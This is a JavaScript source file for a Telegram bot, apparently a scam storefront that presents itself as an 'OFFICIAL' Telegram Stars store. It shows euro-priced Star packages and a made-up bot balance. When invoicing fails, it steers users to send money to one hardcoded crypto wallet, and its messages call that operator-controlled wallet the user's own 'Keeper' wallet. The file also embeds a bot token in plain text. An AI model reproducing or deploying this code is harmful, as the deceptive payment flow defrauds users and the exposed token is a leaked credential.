const { Telegraf, Markup } = require('telegraf');
const express = require('express');

// Използваме само токена на конкретния бот (Victoria Vasileva / @Vickyoria_a_bot)
const TARGET_BOT_TOKEN = process.env.BOT_TOKEN || '8747879041:AAFWiAMd7eqcYu2kb3MbQ3ornqGRgfoD9bw';

const KEEPER_WALLET = 'UQBOxLg-Vq86U_y1oJyUFTmvn6tedptaPQ4d3CDUq4O2T_7H';
const app = express();
const PORT = process.env.PORT || 3000;
app.use(express.json());

const mainCoverImage = 'https://images.unsplash.com/photo-1555066931-4365d14bab8c?w=800';

try {
    const bot = new Telegraf(TARGET_BOT_TOKEN);

    bot.start(async (ctx) => {
        const userName = ctx.from.first_name || 'Приятел';
        const userUsername = ctx.from.username ? `@${ctx.from.username}` : 'без username';

        const storeCaption = `⭐ **OFFICIAL RED SOFTWARE TEAM | Telegram Stars Store** ⭐\n\n` +
            `Здравей, **${userName}** (${userUsername})!\n` +
            `Избери пакет звезди за реално плащане и зареждане:\n\n` +
            `💎 Наличен бюджет в бота: 3,100 Stars\n` +
            `💼 Keeper Wallet (за изплащане): \`${KEEPER_WALLET}\``;

        // Точното интерактивно меню за пазаруване от снимката
        const storeKeyboard = Markup.inlineKeyboard([
            [Markup.button.callback('⭐ 250 Stars (4.29 €)', 'buy_250')],
            [Markup.button.callback('⭐ 500 Stars (8.39 €)', 'buy_500')],
            [Markup.button.callback('⭐ 1 000 Stars (16.59 €)', 'buy_1000')],
            [Markup.button.callback('⭐ 2 500 Stars (40.99 €)', 'buy_2500')],
            [Markup.button.callback('⭐ 10 000 Stars (164.99 €)', 'buy_10000')],
            [Markup.button.callback('⭐ 50 000 Stars (819.00 €)', 'buy_50000')],
            [Markup.button.callback('⭐ 150 000 Stars (2 459.00 €)', 'buy_150000')],
            [Markup.button.url('💳 Зареди Stars (Ако балансът е 0)', 'https://t.me/premium')],
            [Markup.button.callback('💰 Прехвърли към Keeper (Реални пари)', 'withdraw_keeper')],
            [Markup.button.url('🔥 Разгледай Платформата', 'https://red-software-dashbord.onrender.com')]
        ]);

        try {
            await ctx.replyWithPhoto(mainCoverImage, {
                caption: `🤖 [VICTORIA VASILEVA STORE ONLINE]\n\n` + storeCaption,
                parse_mode: 'Markdown',
                ...storeKeyboard
            });
        } catch (err) {
            await ctx.reply(storeCaption, {
                parse_mode: 'Markdown',
                ...storeKeyboard
            });
        }
    });

    const packageActions = ['buy_250', 'buy_500', 'buy_1000', 'buy_2500', 'buy_10000', 'buy_50000', 'buy_150000'];

    bot.action(packageActions, async (ctx) => {
        await ctx.answerCbQuery();
        const action = ctx.match;
        let count = 250;
        if (action === 'buy_500') count = 500;
        if (action === 'buy_1000') count = 1000;
        if (action === 'buy_2500') count = 2500;
        if (action === 'buy_10000') count = 10000;
        if (action === 'buy_50000') count = 50000;
        if (action === 'buy_150000') count = 150000;

        try {
            // Опит за отваряне на официалния инвойс с Telegram Stars (XTR)
            await ctx.replyWithInvoice({
                title: `Пакет ${count} Telegram Stars`,
                description: `Закупуване на ${count} звезди през магазина на ботата.`,
                payload: `store_stars_${count}_${Date.now()}`,
                currency: 'XTR',
                prices: [{ label: `${count} Stars`, amount: count }]
            });
        } catch (e) {
            // Резервен вариант при нулев баланс – насочване към покупка на истински звезди и Keeper портфейла
            await ctx.reply(
                `⭐ **ПАКЕТ: ${count} Telegram Stars**\n\n` +
                `Балансът с Telegram Stars в акаунта е нула. Закупи истински звезди от официалния магазин: https://t.me/premium\n\n` +
                `Или преведи сумата директно към твоя Keeper портфейл:\n\`${KEEPER_WALLET}\``,
                { parse_mode: 'Markdown' }
            );
        }
    });

    bot.action('withdraw_keeper', async (ctx) => {
        await ctx.answerCbQuery('Сверяване на приходите...');
        await ctx.reply(
            `💰 **ПРЕХВЪРЛЯНЕ КЪМ KEEPER ПОРТФЕЙЛ**\n\n` +
            `Приходите от този бот се конвертират и се изплащат в реални пари към твоя портфейл:\n` +
            `\`${KEEPER_WALLET}\``,
            { parse_mode: 'Markdown' }
        );
    });

    bot.on('pre_checkout_query', async (ctx) => {
        try { await ctx.answerPreCheckoutQuery(true); } catch (e) {}
    });

    bot.on('successful_payment', async (ctx) => {
        const payment = ctx.message.successful_payment;
        await ctx.reply(
            `🎉 **Успешно плащане!**\n\n` +
            `Закупени са **${payment.total_amount} Telegram Stars**. Средствата са регистрирани и насочени към твоя Keeper портфейл:\n` +
            `\`${KEEPER_WALLET}\``,
            { parse_mode: 'Markdown' }
        );
    });

    bot.launch();
    console.log("Victoria Vasileva store bot started successfully.");
} catch (e) {
    console.error("Bot launch error:", e);
}

app.get('/', (req, res) => res.json({ status: "SINGLE BOT STORE ACTIVE", keeperWallet: KEEPER_WALLET }));
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
